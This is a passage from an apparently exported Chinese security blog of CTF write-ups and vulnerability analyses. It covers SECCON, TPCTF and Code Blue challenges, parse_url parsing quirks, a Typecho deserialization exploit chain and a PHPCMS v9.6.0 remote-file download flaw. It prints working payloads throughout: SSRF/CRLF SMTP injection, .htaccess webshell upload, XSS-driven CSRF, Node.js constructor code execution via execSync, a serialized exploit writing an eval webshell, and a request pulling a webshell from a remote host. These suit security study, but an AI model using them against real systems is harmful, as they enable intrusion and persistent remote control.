即可获取解密后的明文Yes!Kusomon!!登陆后，可以正常使用wget命令，猜测是wget的bug，谷歌了一发，找到了一个这个http://lists.gnu.org/archive/html/bug-wget/2017-03/msg00018.html那思路很清晰了，ssrf+crlf打内网smtp服务器，先试一发1127.0.0.1%0d%0atest:25 )于是我们构造一个smtp数据包发送一封邮件给用户即可1127.0.0.1%0D%0AHELO%20towca%0D%0AMAIL%20FROM%3A%3Cmy_mail%40gmail.com%3E%0D%0ARCPT%20TO%3A%3Croot%3E%0D%0ADATA%0D%0ASubject%3A%20give%20me%20flag%0D%0A%0D%0Aabc%0D%0A.%0D%0A:25/ 然后就能收到一封包含flag的电子邮件了1SECCON&#123;SSRFisMyFriend!&#125; automatic_door源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374 &lt;?php$fail = str_repeat('fail', 100);$d = 'sandbox/FAIL_' . sha1($_SERVER['REMOTE_ADDR'] . '95aca804b832f4c329d8c0e7c789b02b') . '/';@mkdir($d);function read_ok($f)&#123; return strstr($f, 'FAIL_') === FALSE &amp;&amp; strstr($f, '/proc/') === FALSE &amp;&amp; strstr($f, '/dev/') === FALSE;&#125;function write_ok($f)&#123; return strstr($f, '..') === FALSE &amp;&amp; read_ok($f);&#125;function GetDirectorySize($path)&#123; $bytestotal = 0; $path = realpath($path); if ($path !== false &amp;&amp; $path != '' &amp;&amp; file_exists($path)) &#123; foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS)) as $object) &#123; $bytestotal += $object-&gt;getSize(); &#125; &#125; return $bytestotal;&#125;if (isset($_GET['action'])) &#123; if ($_GET['action'] == 'pwd') &#123; echo $d; exit; &#125; else if ($_GET['action'] == 'phpinfo') &#123; phpinfo(); exit; &#125; else if ($_GET['action'] == 'read') &#123; $f = $_GET['filename']; if (read_ok($f)) echo file_get_contents($d . $f); else echo $fail; exit; &#125; else if ($_GET['action'] == 'write') &#123; $f = $_GET['filename']; if (write_ok($f) &amp;&amp; strstr($f, 'ph') === FALSE &amp;&amp; $_FILES['file']['size'] &lt; 10000) &#123; print_r($_FILES['file']); print_r(move_uploaded_file($_FILES['file']['tmp_name'], $d . $f)); &#125; else echo $fail; if (GetDirectorySize($d) &gt; 10000) &#123; rmdir($d); &#125; exit; &#125; else if ($_GET['action'] == 'delete') &#123; $f = $_GET['filename']; if (write_ok($f)) print_r(unlink($d . $f)); else echo $fail; exit; &#125;&#125;highlight_file(__FILE__); 我们可以上传文件，但是后缀不能含有ph所以不能上传ph，那这种上传肯定是上传.htacess然后修改一下类型1AddType application/x-httpd-php .html .htm 然后我们传一个php一句话用html作为后缀名，但是phpinfo中过滤了大多函数1system、exec、shell_exec、 passthru、popen、proc_popen 找一个没有过滤的proc_popen1SECCON&#123;f6c085facd0897b47f5f1d7687030ae7&#125;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TPCTF-WEBwriteup]]></title>
    <url>%2Ftpctfwp.html</url>
    <content type="text"><![CDATA[ad这题巨坑提示说从本站找，翻了翻功能，发现一个/about页面，然而并没有啥东西，后来根据题目ad脑洞把火狐的adblock关了，得到flag1tpctf&#123;thx_4_n0_adb1ock&#125; method这题也入坑了好久题目说要找到一个使服务器产生问题的page，就可以得到flag访问problem提示说flag不在这里结果试了各种爆错和扫描器，最后冷静下看题目提示是method于是试了一遍methosget,post,put,options,delete在delete的时候发现了flag3.What is this place?一打开是个这样的页面根据提示加一句话1&lt;script&gt;alert(window.location)&lt;/script&gt; 再根据提示截取前16个字符访问得到flag1tpctf&#123;w4i7_r3pl_d03s_7h15?&#125; Management打开是个注册页面，注册一个pupiles用户后进入，进入后逻辑大概是这样的create会把数字和value一起插入到数据库，read会把相应的sql语句和返回结果(上一步的value)打印出来。这里本来以为是二次注入，没想到随手一试直接出了flag…(迷 It’s Common Sense进去给了一个站，浏览了一下大概有如下几个功能 重置密码，会给你输入的邮箱发送一封重置密码的邮件 提交产品评论看到这里，大概明白了如何下手了，csrf+重置管理员密码在产品评论处提交xsspayload123456&lt;script&gt;var payload = new XMLHttpRequest();payload.open("POST", "https://commonsensereviews.tpctf.tk/account", false);payload.setRequestHeader('Content-Type','application/x-www-form-urlencoded');payload.send("email=你的邮箱地址&amp;formbtn=Send+Request");&lt;/script&gt; 这样就可以收到邮件12345Reset Your PasswordCongratulations! Normally, you would&apos;ve reset the administrators password.For the purposes of this challenge,the flag is tpctf&#123;D1D_Y0U_N0t1c3_Common_Sense_Reviews_1s_P4R7_0F_CSRF_19210jka010920aff&#125;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[parse_url的小trick]]></title>
    <url>%2F%E8%B0%88%E8%B0%88parse_url.html</url>
    <content type="text"><![CDATA[最近几次比赛都用到了parse_url的解析漏洞，所以我就在这里做一波总结 php协议错误先放测试代码123&lt;?php$url = $_GET['url'];var_dump(parse_url($url)); 众所周知，parse_url在url不能被解析的时候就会返回false，然而却没有表明为什么他会爆错。我们从源码里看一下parse_url 全版本通杀当一个url没有协议的时候，但是给一个端口url的字符串的时候parse_url就会爆错1/pupiles.com:80 这个经测试在windwos下应该是php版本全通杀的(5.2-7.0),linux没测试过 url解析错误接上发现只要端口后面跟字母还是会解析，比如123/pupiles.com:80aarray (size=1) 'path' =&gt; string '/pupiles.com:80a' (length=16) 端口解析错误php5.5以上1//pupiles.com/about:1234 这样的url用parse_url解析后预测的结果是123456array(2) &#123; ["host"]=&gt; string(11) "pupiles.com" ["path"]=&gt; string(9) "/about:1234"&#125; 然而实际结果是12345678array(3) &#123; ["host"]=&gt; string(11) "pupiles.com" ["port"]=&gt; int(1234) ["path"]=&gt; string(9) "/about:1234"&#125; 会默认解析出一个portkey 路径解析错误12345678910&lt;!--?php// single slash case$uri = "/upload?/home/binarycloud/";$data = parse_url($uri);print_r($data);// doubleslash case$uri = "//upload?/home/binarycloud/";$data = parse_url($uri);print_r($data);?--&gt; 输出结果12345678910Array( [path] =&gt; /upload [query] =&gt; /home/binarycloud/)Array( [host] =&gt; upload? [path] =&gt; /home/binarycloud/) 端口溢出在php5.3.13版本以下，当输入如下url1http://pupiles:78325 按照正常来说应该会返回false，但是这里会返回12345array(3) &#123; ["scheme"]=&gt; string(4) "http" ["host"]=&gt; string(7) "pupiles" ["port"]=&gt; int(12789) &#125;]]></content>
      <categories>
        <category>learning</category>
      </categories>
      <tags>
        <tag>learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[code-blueCTF-writeup]]></title>
    <url>%2Fcode-blue-ctf.html</url>
    <content type="text"><![CDATA[#guestroom下载源码审计首先我们来看如何得到flag123456$app-&gt;get('/flag', function () use ($app) &#123; if (isset($_SESSION['is_logined']) === false || isset($_SESSION['is_guest']) === true) &#123; $app-&gt;redirect('/#try+harder'); &#125; return $app-&gt;flag;&#125;); 这里我们需要构造is_guest===false,所以我们来看一下注册函数1234567891011121314151617181920212223242526272829$app-&gt;post('/register', function () use ($app) &#123; $id = (isset($_POST['id']) === true &amp;&amp; $_POST['id'] !== '') ? (string)$_POST['id'] : die('Missing id'); $pw = (isset($_POST['pw']) === true &amp;&amp; $_POST['pw'] !== '') ? (string)$_POST['pw'] : die('Missing pw'); $code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : ''; if (strlen($id) &gt; 32 || strlen($pw) &gt; 32) &#123; die('Invalid input'); &#125; $sth = $app-&gt;pdo-&gt;prepare('SELECT id FROM users WHERE id = :id'); $sth-&gt;execute([':id' =&gt; $id]); if ($sth-&gt;fetch() !== false) &#123; $app-&gt;redirect('/#duplicate+id'); &#125; $sth = $app-&gt;pdo-&gt;prepare('INSERT INTO users (id, pw) VALUES (:id, :pw)'); $sth-&gt;execute([':id' =&gt; $id, ':pw' =&gt; $pw]); preg_match('/\A(ADMIN|USER|GUEST)--((?:###|\w)+)\z/i', $code, $matches); if (count($matches) === 3 &amp;&amp; $app-&gt;code[$matches[1]] === $matches[2]) &#123; $sth = $app-&gt;pdo-&gt;prepare('INSERT INTO acl (id, authorize) VALUES (:id, :authorize)'); $sth-&gt;execute([':id' =&gt; $id, ':authorize' =&gt; $matches[1]]); &#125; else &#123; $sth = $app-&gt;pdo-&gt;prepare('INSERT INTO acl (id, authorize) VALUES (:id, "GUEST")'); $sth-&gt;execute([':id' =&gt; $id]); &#125; $app-&gt;redirect('/#registered');&#125;); 重点在这里1234567if (count($matches) === 3 &amp;&amp; $app-&gt;code[$matches[1]] === $matches[2]) &#123; $sth = $app-&gt;pdo-&gt;prepare('INSERT INTO acl (id, authorize) VALUES (:id, :authorize)'); $sth-&gt;execute([':id' =&gt; $id, ':authorize' =&gt; $matches[1]]); &#125; else &#123; $sth = $app-&gt;pdo-&gt;prepare('INSERT INTO acl (id, authorize) VALUES (:id, "GUEST")'); $sth-&gt;execute([':id' =&gt; $id]); &#125; 如果count($matches) === 3 &amp;&amp; $app-&gt;code[$matches[1]] === $matches[2]那么我们的authorize字段就不是guest，但是我们的code变量已经定义为null了12345$app-&gt;code = [ 'ADMIN' =&gt; null, // TODO: Set code 'USER' =&gt; null, // TODO: Set code 'GUEST' =&gt; '###GUEST###']; 所以这里我们匹配不到，但是我们看一下登陆时候的验证12345$sth = $app-&gt;pdo-&gt;prepare('SELECT authorize FROM acl WHERE id = :id'); $sth-&gt;execute([':id' =&gt; $_SESSION['id']]); if ($sth-&gt;fetch()[0] === 'GUEST') &#123; $_SESSION['is_guest'] = true; &#125; 我们只要让acl中的值为null其实也是可以过的，那我们如何构造这个null数值呢?这里就需要用到一个pre_mathch黑魔法，我们知道pre_match是非常占用系统资源的，如果我们构造一个大量的数据给pre_match匹配的话，那么php就会因为加载超时而爆错，那么接下来的php语句也就不会执行，也就是这里的12$sth = $app-&gt;pdo-&gt;prepare('INSERT INTO acl (id, authorize) VALUES (:id, "GUEST")'); $sth-&gt;execute([':id' =&gt; $id]); 这样我们数据库中的值就为null，取出来的时候自然也为null，成功绕过。本地测试构造一个12345&lt;?$a = $_POST[&apos;a&apos;];preg_match(&apos;/\A(ADMIN|USER|GUEST)--((?:###|\w)+)\Z/i&apos;, $a, $matches);echo 2;?&gt; 传入a=admin--#################(N)会爆错 #SSR这题没做出来，赛后照着0ops大师傅们的wp复现了一下一打开发现一个大大的登陆窗口登陆进去发现可以获得一个随机品质的idol(类似式神一样的东西，分为SR,R,SSR)，这里发现抓不了包，那么说明是js的功能。继续浏览发现每个式神又可以执行三个动作，同样是js功能。然后我就开始懵逼，完全不知道干什么，后来刷新页面的时候发现了一个idol.php的请求，会发送自己idol的json格式数据，如图尝试fuzz一下数据，发现构造一个错误的idols的时候会爆错1[&#123;&quot;key&quot;:[&quot;p&quot;,&quot;0&quot;]&#125;,&#123;&quot;key&quot;:[&quot;ssr&quot;,&quot;0&quot;]&#125;] 返回500错误1234567891011TypeError: Cannot read property &apos;0&apos; of undefined at generateIdol (/usr/local/ssr/build/server.js:144:49) at /usr/local/ssr/build/server.js:172:12 at Array.map (&lt;anonymous&gt;) at unserializeIdols (/usr/local/ssr/build/server.js:169:20) at new Idols (/usr/local/ssr/build/server.js:748:42) at /usr/local/ssr/node_modules/react-dom/lib/ReactCompositeComponent.js:292:18 at measureLifeCyclePerf (/usr/local/ssr/node_modules/react-dom/lib/ReactCompositeComponent.js:73:12) at ReactCompositeComponentWrapper._constructComponentWithoutOwner (/usr/local/ssr/node_modules/react-dom/lib/ReactCompositeComponent.js:291:16) at ReactCompositeComponentWrapper._constructComponent (/usr/local/ssr/node_modules/react-dom/lib/ReactCompositeComponent.js:282:19) at ReactCompositeComponentWrapper.mountComponent (/usr/local/ssr/node_modules/react-dom/lib/ReactCompositeComponent.js:185:21) 在第一行看到generateIdol，所以直接在firefox调试器里的client.js里面搜索generateIdol12345678var generateIdol = function generateIdol(key) &#123; var _key = _slicedToArray(key, 2), rarity = _key[0], idolNo = _key[1]; var idolClass = _idolDatabase2.default[rarity][idolNo]; return new idolClass(key);&#125;; 当我们传入一个javascript的魔法属性的时候1[&#123;&quot;key&quot;:[&quot;constructor&quot;,&quot;constructor&quot;,&quot;0%3Breturn 1&quot;]&#125;] 将会执行12var idolClass = _idolDatabase2.default[&quot;constructor&quot;][&quot;constructor&quot;];return new idolClass([&quot;constructor&quot;,&quot;constructor&quot;,&quot;0;return &apos;1&apos;&quot;]); 这样我们就会得到一个可以任意代码执行的函数1[&#123;&quot;key&quot;:[&quot;constructor&quot;,&quot;constructor&quot;,&quot;0%3Breturn process.mainModule.require(&apos;child_process&apos;).execSync(&apos;ls /usr/local/ssr/&apos;)+&apos;&apos;&quot;]&#125;] 所以具体payload如下12[&#123;&quot;key&quot;:[&quot;constructor&quot;,&quot;constructor&quot;,&quot;0%3Breturn process.mainModule.require(&apos;child_process&apos;).execSync(&apos;ls /usr/local/ssr/&apos;)+&apos;&apos;&quot;]&#125;] [&#123;&quot;key&quot;:[&quot;constructor&quot;,&quot;constructor&quot;,&quot;0%3Breturn process.mainModule.require(&apos;child_process&apos;).execSync(&apos;ls /usr/local/ssr/&apos;)+&apos;&apos;&quot;]&#125;] 得到flag1CBCTF&#123;server_side_render1ng_1s_Soo_fun&#125;]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[typecho反序列化漏洞分析]]></title>
    <url>%2Ftypecho.html</url>
    <content type="text"><![CDATA[在写之前必须感叹一下静态博客的好~~~ 源码地址 https://github.com/pupiles/vulcms测试环境Seay源代码审计系统 + PHP5.4 + firefox漏洞url1http://localhost/typecho/install.php 漏洞细节首先我们直接切入漏洞存在的文件install.php59行12345678910111213141516171819if (!isset($_GET['finish']) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . '/config.inc.php') &amp;&amp; empty($_SESSION['typecho'])) &#123; exit;&#125;// 挡掉可能的跨站请求if (!empty($_GET) || !empty($_POST)) &#123; if (empty($_SERVER['HTTP_REFERER'])) &#123; exit; &#125; $parts = parse_url($_SERVER['HTTP_REFERER']); if (!empty($parts['port'])) &#123; $parts['host'] = "&#123;$parts['host']&#125;:&#123;$parts['port']&#125;"; &#125; if (empty($parts['host']) || $_SERVER['HTTP_HOST'] != $parts['host']) &#123; exit; &#125;&#125; 这里比较容易绕过，finish参数不能为空，然后refer必须是本站230行12345678&lt;?php else : ?&gt; &lt;?php $config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config'))); Typecho_Cookie::delete('__typecho_config'); $db = new Typecho_Db($config['adapter'], $config['prefix']); $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE); Typecho_Db::set($db); ?&gt; 这里注意一下1$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config'))); 这里如果我们的Typecho_Cookie::get(&#39;__typecho_config&#39;)的可控的话，那么就可能存在反序列化漏洞，跟进Typecho_Cookie类下的get方法看看。123456public static function get($key, $default = NULL) &#123; $key = self::$_prefix . $key; $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default); return is_array($value) ? $default : $value; &#125; 这里的逻辑是先判断存不存在$_COOKIE，如果不存在就直接从$_POST中取，不管是哪种情况我们都可以控制了反序列化内容。跳回去我们继续看1$db = new Typecho_Db($config['adapter'], $config['prefix']); 这里实例化了Typecho_Db,同样拐进去看一下这个类的__construct魔法方法12345678910111213141516171819202122public function __construct($adapterName, $prefix = 'typecho_') &#123; /** 获取适配器名称 */ $this-&gt;_adapterName = $adapterName; /** 数据库适配器 */ $adapterName = 'Typecho_Db_Adapter_' . $adapterName; if (!call_user_func(array($adapterName, 'isAvailable'))) &#123; throw new Typecho_Db_Exception("Adapter &#123;$adapterName&#125; is not available"); &#125; $this-&gt;_prefix = $prefix; /** 初始化内部变量 */ $this-&gt;_pool = array(); $this-&gt;_connectedPool = array(); $this-&gt;_config = array(); //实例化适配器对象 $this-&gt;_adapter = new $adapterName(); &#125; 这时候我们的关键漏洞代码就出现了1$adapterName = 'Typecho_Db_Adapter_' . $adapterName; 这里是把$adapterName进行了字符串拼接，这个$adapterName是我们可控的变量类型，我们知道当一个类被直接当成字符串的时候会调用__toString魔法方法，所以我们这时候只要全局搜索一下__toString方法即可。一番搜索后我们来到Feed.php这里__toString方法太长了，我在这里只截取关键部分代码12345678910111213public function __toString() &#123; $result = '&lt;?xml version="1.0" encoding="' . $this-&gt;_charset . '"?&gt;' . self::EOL; ... ... ... foreach ($this-&gt;_items as $item) &#123; $content .= '&lt;item&gt;' . self::EOL; $content .= '&lt;title&gt;' . htmlspecialchars($item['title']) . '&lt;/title&gt;' . self::EOL; $content .= '&lt;link&gt;' . $item['link'] . '&lt;/link&gt;' . self::EOL; $content .= '&lt;guid&gt;' . $item['link'] . '&lt;/guid&gt;' . self::EOL; $content .= '&lt;pubDate&gt;' . $this-&gt;dateFormat($item['date']) . '&lt;/pubDate&gt;' . self::EOL; $content .= '&lt;dc:creator&gt;' . htmlspecialchars($item['author']-&gt;screenName) . '&lt;/dc:creator&gt;' . self::EOL; 这里我们可以看一下关键部分1$content .= '&lt;dc:creator&gt;' . htmlspecialchars($item['author']-&gt;screenName) . '&lt;/dc:creator&gt;' . self::EOL; 这里我们获取了$item[&#39;author&#39;]-&gt;screenName，这里有个php反序列化的知识点，当我们试图去访问一个对象的不存在或者私有属性的时候会触发__get魔法方法。所以这里如果我们的$item[&#39;author&#39;]是一个对象，且该对象没有screenName属性，那么我们就可以利用__get方法,那么思路又清晰了，全局搜索__get方法。找到Request.php找到目标方法1234public function __get($key) &#123; return $this-&gt;get($key); &#125; 跟进get方法1234567891011121314151617public function get($key, $default = NULL) &#123; switch (true) &#123; case isset($this-&gt;_params[$key]): $value = $this-&gt;_params[$key]; break; case isset(self::$_httpParams[$key]): $value = self::$_httpParams[$key]; break; default: $value = $default; break; &#125; $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default; return $this-&gt;_applyFilter($value); &#125; 这里又调用了_applyFilter方法12345678910111213private function _applyFilter($value) &#123; if ($this-&gt;_filter) &#123; foreach ($this-&gt;_filter as $filter) &#123; $value = is_array($value) ? array_map($filter, $value) : call_user_func($filter, $value); &#125; $this-&gt;_filter = array(); &#125; return $value; &#125; 这里熟悉php的小伙伴肯定一眼就看出来了call_user_func命令执行，而$filter和$value都是我们可控的。照着这个逻辑我们来尝试写一下exp。exp12345678910111213141516171819202122232425262728293031323334&lt;?phpclass Typecho_Feed&#123; const RSS2 = 'RSS 2.0'; private $_type; private $_items; private $_charset; public function __construct()&#123; $this-&gt;_type = $this::RSS2; $this-&gt;_items[0] = array( 'author' =&gt; new Typecho_Request(), ); &#125;&#125;class Typecho_Request&#123; private $_params = array(); private $_filter = array(); public function __construct()&#123; $this-&gt;_params['screenName'] = 'phpinfo()'; $this-&gt;_filter[0] = 'assert'; &#125;&#125;$exp = array( 'adapter' =&gt; new Typecho_Feed(), 'prefix' =&gt; '_pupiles');echo base64_encode(serialize($exp)); 然而写完这个exp怎么打都是返回服务器500，晕倒爆炸，后来看了Loy师傅的文章，才知道原来是ob_start原因。这里开启了ob_start的话会让脚本没有回显，同时我们的exp会触发自有的exception，我们看看触发exception会出现什么后果12345678910111213141516171819public static function exceptionHandle($exception) &#123; if (defined('__TYPECHO_DEBUG__')) &#123; echo '&lt;pre&gt;&lt;code&gt;'; echo '&lt;h1&gt;' . htmlspecialchars($exception-&gt;getMessage()) . '&lt;/h1&gt;'; echo htmlspecialchars($exception-&gt;__toString()); echo '&lt;/code&gt;&lt;/pre&gt;'; &#125; else &#123; @ob_end_clean(); if (404 == $exception-&gt;getCode() &amp;&amp; !empty(self::$exceptionHandle)) &#123; $handleClass = self::$exceptionHandle; new $handleClass($exception); &#125; else &#123; self::error($exception); &#125; &#125; exit; &#125; 调用了ob_end_clean方法清空了缓冲区，所以我们的phpinfo没有显示出来，不过php还是执行的，这就意味这我们可以修改以上代码12345678910class Typecho_Request&#123; private $_params = array(); private $_filter = array(); public function __construct()&#123; $this-&gt;_params['screenName'] = "file_put_contents('pupiles.php', '&lt;?php @eval($_POST[xdsec]); ?&gt;')"; $this-&gt;_filter[0] = 'assert'; &#125;&#125; 这样虽然没有回显但是我们的php还是成功写入了。而Loy师傅给出了2种产生回显的解决方案 因为 call_user_func 函数处是一个循环，我们可以通过设置数组来控制第二次执行的函数，然后找一处exit跳出，缓冲区中的数据就会被输出出来。 第二个办法就是在命令执行之后，想办法造成一个报错，语句报错就会强制停止，这样缓冲区中的数据仍然会被输出出来。同时给出了他的payload1234567public function __construct()&#123; $this-&gt;_type = $this::RSS2; $this-&gt;_items[0] = array( 'category' =&gt; array(new Typecho_Request()), 'author' =&gt; new Typecho_Request(), ); &#125; 加了一行1'category' =&gt; array(new Typecho_Request()), 我们回到代码中引入category变量的地方12345if (!empty($item['category']) &amp;&amp; is_array($item['category'])) &#123; foreach ($item['category'] as $category) &#123; $content .= '&lt;category&gt;&lt;![CDATA[' . $category['name'] . ']]&gt;&lt;/category&gt;' . self::EOL; &#125; &#125; 这里如果我们把一个任意类的对象封装成一个数组传给category的时候其实就是变相构造了一个报错，使其无法正常的执行ob_end_clean()。好啦，分析完刚好一点，上床睡觉美滋滋，迎接美好(累成狗)的周末PS(其实我还是不知道这个原生的exception是如何触发的，如果有知道的师傅麻烦留个言谢谢)]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHPCMSv9.6.0任意文件下载漏洞分析]]></title>
    <url>%2Fphpcms.html</url>
    <content type="text"><![CDATA[比较久的一个洞了，当时正好没啥时间看，今天突然想起来，那就翻出来分析一波把23333 源码地址 https://github.com/pupiles/vulcms测试环境PHPSTORM + XDEBUG + PHP5.4 + firefox漏洞url1http://localhost/install_package/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 漏洞exp1siteid=1&amp;modelid=1&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://files.pupiles.com/webshell/webshell.php#.jpg&gt;&amp;dosubmit=1 漏洞演示如下:然后会返回操作失败然而我们的webshell已经存放在目标站的upload下了 漏洞细节首先我们看一下逻辑知道目标漏洞位于普通用户的注册逻辑处，那么按照一般MVC的尿性我们打开，应该在modules=member&amp;&amp;method=register处,于是我们就来到1phpcms/modules/member/index.php 根据exp直接搜索$_POST[&#39;info&#39;]，来到130行12345678//附表信息验证 通过模型获取会员信息 if($member_setting['choosemodel']) &#123; require_once CACHE_MODEL_PATH.'member_input.class.php'; require_once CACHE_MODEL_PATH.'member_update.class.php'; $member_input = new member_input($userinfo['modelid']); $_POST['info'] = array_map('new_html_special_chars',$_POST['info']); $user_model_info = $member_input-&gt;get($_POST['info']); &#125; 这里我们可以看到$_POST[‘info’]经过一个叫做array_map函数处理，也就是$_POST[‘info’]经过一个自定义的叫做new_html_special_chars的函数处理，我们拐进去看一下(快捷键ctrl+b)。1234567function new_html_special_chars($string) &#123; $encoding = 'utf-8'; if(strtolower(CHARSET)=='gbk') $encoding = 'gb2312'; if(!is_array($string)) return htmlspecialchars($string,ENT_COMPAT,$encoding); foreach($string as $key =&gt; $val) $string[$key] = new_html_special_chars($val); return $string;&#125; 没啥特别的。就是把数组拆开，然后对每个值进行htmlspecial处理。我们跳回去再看1$user_model_info = $member_input-&gt;get($_POST['info']) 这里调用了$member_input类的get方法，而这个$member_input又是member_input类的一个对象。这里我想提一个题外话，注意一下实例化的时候传入了一个$userinfo[&#39;modelid&#39;]参数，这个参数其实就是我们exp中的modelid=1，这里这个参数其实对于此漏实并没有影响。然后我们来看一下我们的大头戏get方法1234567891011121314151617181920212223242526272829303132333435function get($data) &#123; $this-&gt;data = $data = trim_script($data); $model_cache = getcache('member_model', 'commons'); $this-&gt;db-&gt;table_name = $this-&gt;db_pre.$model_cache[$this-&gt;modelid]['tablename']; $info = array(); $debar_filed = array('catid','title','style','thumb','status','islink','description'); if(is_array($data)) &#123; foreach($data as $field=&gt;$value) &#123; if($data['islink']==1 &amp;&amp; !in_array($field,$debar_filed)) continue; $field = safe_replace($field); $name = $this-&gt;fields[$field]['name']; $minlength = $this-&gt;fields[$field]['minlength']; $maxlength = $this-&gt;fields[$field]['maxlength']; $pattern = $this-&gt;fields[$field]['pattern']; $errortips = $this-&gt;fields[$field]['errortips']; if(empty($errortips)) $errortips = "$name 不符合要求！"; $length = empty($value) ? 0 : strlen($value); if($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage("$name 不得少于 $minlength 个字符！"); if (!array_key_exists($field, $this-&gt;fields)) showmessage('模型中不存在'.$field.'字段'); if($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123; showmessage("$name 不得超过 $maxlength 个字符！"); &#125; else &#123; str_cut($value, $maxlength); &#125; if($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips); if($this-&gt;fields[$field]['isunique'] &amp;&amp; $this-&gt;db-&gt;get_one(array($field=&gt;$value),$field) &amp;&amp; ROUTE_A != 'edit') showmessage("$name 的值不得重复！"); $func = $this-&gt;fields[$field]['formtype']; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); $info[$field] = $value; &#125; &#125; return $info; &#125; 代码balabala写的挺长的，不过我们这时候我们只需要提取一些关键部分的代码，像一些对于变量本身的值没有影响以及无关变量的代码就可以省去了，就跟做英语阅读理解一样。举个栗子，像这段代码中的变量赋值，以及对我们本身关注的变量$value没有影响的代码就可以省去了，精简完如下12345678910111213function get($data) &#123; $this-&gt;data = $data = trim_script($data); $info = array(); if(is_array($data)) &#123; $field = safe_replace($field); foreach($data as $field=&gt;$value) &#123; $func = $this-&gt;fields[$field]['formtype']; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); $info[$field] = $value; &#125; &#125; return $info; &#125; 这样代码就看起来就很容易理解了，好了回到正题。这里我们的$data也就是$_POST[&#39;info&#39;]显示经过了一个叫做trim_script的函数处理，我们依然拐进去看一下。12345678910111213function trim_script($str) &#123; if(is_array($str))&#123; foreach ($str as $key =&gt; $val)&#123; $str[$key] = trim_script($val); &#125; &#125;else&#123; $str = preg_replace ( '/\&lt;([\/]?)script([^\&gt;]*?)\&gt;/si', '&amp;lt;\\1script\\2&amp;gt;', $str ); $str = preg_replace ( '/\&lt;([\/]?)iframe([^\&gt;]*?)\&gt;/si', '&amp;lt;\\1iframe\\2&amp;gt;', $str ); $str = preg_replace ( '/\&lt;([\/]?)frame([^\&gt;]*?)\&gt;/si', '&amp;lt;\\1frame\\2&amp;gt;', $str ); $str = str_replace ( 'javascript:', 'javascript：', $str ); &#125; return $str;&#125; 转义了一些特殊的标签，跟我们没啥关系，那我们就跳回来继续看。来到1$field = safe_replace($field); 依旧拐进去看一下12345678910111213141516function safe_replace($string) &#123; $string = str_replace('%20','',$string); $string = str_replace('%27','',$string); $string = str_replace('%2527','',$string); $string = str_replace('*','',$string); $string = str_replace('"','&amp;quot;',$string); $string = str_replace("'",'',$string); $string = str_replace('"','',$string); $string = str_replace(';','',$string); $string = str_replace('&lt;','&amp;lt;',$string); $string = str_replace('&gt;','&amp;gt;',$string); $string = str_replace("&#123;",'',$string); $string = str_replace('&#125;','',$string); $string = str_replace('\\','',$string); return $string;&#125; 把我们的payload的&lt;,&gt;替换成字符实体了，然而不管我们跳回来继续看。12$func = $this-&gt;fields[$field][&apos;formtype&apos;]; if(method_exists($this, $func)) $value = $this-&gt;$func($field, $value); 这段代码大致的意思判断$func方法是否存在，如果存在，就用$func方法处理我们的关键变量$value，可是看到这里我相信很多同学都跟我有一样的疑问，$this-&gt;fields是什么?$this-&gt;fields[$field]又是什么?$func到底是神魔鬼啊?这时候我们就要掏出神器xdebug来进行动态调试，先设个断点。接着调试页面，输入我们的exp，可以看到我们在断点处停下来了果断F7下一步这里我们可以到$func的值为editor并且content跟我预测的一样，标签符被替换成了字符实体。好了，既然我们知道了$func的值，那我们就去跳去本类下的editor方法处看看有没有什么惊喜吧。12345678function editor($field, $value) &#123; $setting = string2array($this-&gt;fields[$field]['setting']); $enablesaveimage = $setting['enablesaveimage']; $site_setting = string2array($this-&gt;site_config['setting']); $watermark_enable = intval($site_setting['watermark_enable']); $value = $this-&gt;attachment-&gt;download('content', $value,$watermark_enable); return $value; &#125; 这里我们可以看到全场最关键的部分来了1$value = $this-&gt;attachment-&gt;download(&apos;content&apos;, $value,$watermark_enable); 这是什么?下载啊，赶紧跟进去看一下123456789101112131415161718192021222324252627282930313233343536373839404142434445function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '') &#123; global $image_d; $this-&gt;att_db = pc_base::load_model('attachment_model'); $upload_url = pc_base::load_config('system','upload_url'); $this-&gt;field = $field; $dir = date('Y/md/'); $uploadpath = $upload_url.$dir; $uploaddir = $this-&gt;upload_root.$dir; $string = new_stripslashes($value); if(!preg_match_all("/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i", $string, $matches)) return $value; $remotefileurls = array(); foreach($matches[3] as $matche) &#123; if(strpos($matche, '://') === false) continue; dir_create($uploaddir); $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref); &#125; unset($matches, $string); $remotefileurls = array_unique($remotefileurls); $oldpath = $newpath = array(); foreach($remotefileurls as $k=&gt;$file) &#123; if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue; $filename = fileext($file); $file_name = basename($file); $filename = $this-&gt;getname($filename); 